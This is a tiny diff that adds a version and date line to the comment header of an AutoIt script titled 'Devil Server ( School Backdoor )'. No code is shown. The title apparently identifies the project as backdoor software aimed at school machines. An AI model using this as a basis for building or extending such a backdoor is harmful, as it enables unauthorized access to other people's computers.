@@ -2,6 +2,7 @@
  
  Devil Server ( School Backdoor )
  AutoIt Version: 3.3.14.2
+  Version: Alpha (21:12 7.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
